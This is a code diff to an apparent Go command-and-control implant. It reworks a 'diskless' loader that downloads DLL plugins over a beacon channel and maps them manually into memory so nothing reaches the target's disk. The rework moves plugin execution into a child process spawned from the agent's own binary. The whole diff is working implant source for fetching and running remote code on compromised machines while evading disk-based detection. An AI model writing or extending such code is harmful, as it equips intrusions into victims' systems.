@@ -3,7 +3,7 @@
 // Diskless PE plugin loader.
 //
 // Plugins are DLL images fetched over the authenticated beacon channel
-// and mapped into this process with an NT section object. Nothing is
+// and mapped into a dedicated child process with an NT section object. Nothing is
 // ever written to the target disk: the bytes stay in memory from the
 // HTTP response to the mapped image. The image is mapped twice from one
 // section object, PAGE_READWRITE for staging and PAGE_EXECUTE_READ for
@@ -18,14 +18,20 @@ package main
 
 import (
 	"bytes"
+	"context"
 	"debug/pe"
 	"encoding/binary"
 	"errors"
 	"fmt"
+	"io"
 	"net/http"
+	"os"
+	"os/exec"
+	"regexp"
 	"runtime"
-	"sync"
+	"strings"
 	"syscall"
+	"time"
 	"unsafe"
 )
 
@@ -54,32 +60,82 @@ var (
 	procLoadLibraryA         = kernel32Mod.NewProc("LoadLibraryA")
 	procGetProcAddress       = kernel32Mod.NewProc("GetProcAddress")
 	procVirtualProtect       = kernel32Mod.NewProc("VirtualProtect")
-	pluginMu                 sync.Mutex
-	pluginBases              = make(map[string]uintptr)
 )
 
-// loadPluginPE fetches the plugin from the beacon server on first use,
-// maps it into this process, and calls the requested export. Mapped
-// plugins are cached so repeated commands reuse the same image.
+var pluginExportPattern = regexp.MustCompile(`^[A-Za-z_][A-Za-z0-9_]{0,127}$`)
+
+// loadPluginPE fetches the plugin in the parent, then sends the raw DLL bytes
+// to a child over stdin. The child performs all mapping and export execution.
 func loadPluginPE(client *http.Client, cfg *config, url, exportName, input string) (string, error) {
 	if runtime.GOARCH != "amd64" {
 		return "", errors.New("PE plugins require the windows/amd64 agent build")
 	}
-	pluginMu.Lock()
-	defer pluginMu.Unlock()
-	base, cached := pluginBases[url]
-	if !cached {
-		data, err := request(client, cfg, http.MethodGet, url, values(cfg), nil)
-		if err != nil {
-			return "", fmt.Errorf("plugin download failed: %w", err)
-		}
-		base, err = mapPluginPE(data)
-		if err != nil {
-			return "", err
-		}
-		pluginBases[url] = base
+	data, err := request(client, cfg, http.MethodGet, url, values(cfg), nil)
+	if err != nil {
+		return "", fmt.Errorf("plugin download failed: %w", err)
 	}
-	return callPluginExport(base, exportName, input)
+	var frame bytes.Buffer
+	_ = binary.Write(&frame, binary.LittleEndian, uint32(len(data)))
+	_ = binary.Write(&frame, binary.LittleEndian, uint32(len(input)))
+	_, _ = frame.Write(data)
+	_, _ = frame.WriteString(input)
+
+	ctx, cancel := context.WithTimeout(context.Background(), pluginRunTimeout)
+	defer cancel()
+	cmd := exec.CommandContext(ctx, os.Args[0], "--plugin-child", exportName)
+	cmd.Stdin = &frame
+	var stdout, stderr bytes.Buffer
+	cmd.Stdout = &stdout
+	cmd.Stderr = &stderr
+	if err := cmd.Run(); err != nil {
+		if ctx.Err() != nil {
+			return "", fmt.Errorf("plugin timed out after %s", pluginRunTimeout)
+		}
+		message := strings.TrimSpace(stderr.String())
+		if message == "" {
+			message = err.Error()
+		}
+		return "", fmt.Errorf("plugin child failed: %s", message)
+	}
+	return strings.TrimRight(stdout.String(), "\x00\r\n"), nil
+}
+
+const pluginRunTimeout = 10 * time.Minute
+
+// runPluginChild reads one length-prefixed DLL and input from stdin, maps the
+// image in this child, and writes the plugin result to stdout.
+func runPluginChild(args []string) error {
+	if len(args) != 2 || !pluginExportPattern.MatchString(args[1]) {
+		return errors.New("usage: --plugin-child <export>")
+	}
+	var pluginLen, inputLen uint32
+	if err := binary.Read(os.Stdin, binary.LittleEndian, &pluginLen); err != nil {
+		return fmt.Errorf("read plugin frame: %w", err)
+	}
+	if err := binary.Read(os.Stdin, binary.LittleEndian, &inputLen); err != nil {
+		return fmt.Errorf("read plugin input length: %w", err)
+	}
+	if pluginLen == 0 || pluginLen > 512*1024*1024 || inputLen > 4096 {
+		return errors.New("invalid plugin frame sizes")
+	}
+	data := make([]byte, pluginLen)
+	if _, err := io.ReadFull(os.Stdin, data); err != nil {
+		return fmt.Errorf("read plugin bytes: %w", err)
+	}
+	input := make([]byte, inputLen)
+	if _, err := io.ReadFull(os.Stdin, input); err != nil {
+		return fmt.Errorf("read plugin input: %w", err)
+	}
+	base, err := mapPluginPE(data)
+	if err != nil {
+		return err
+	}
+	result, err := callPluginExport(base, args[1], string(input))
+	if err != nil {
+		return err
+	}
+	_, err = os.Stdout.WriteString(result)
+	return err
 }
 
 // mapPluginPE manually maps a PE32+ amd64 DLL image into the current
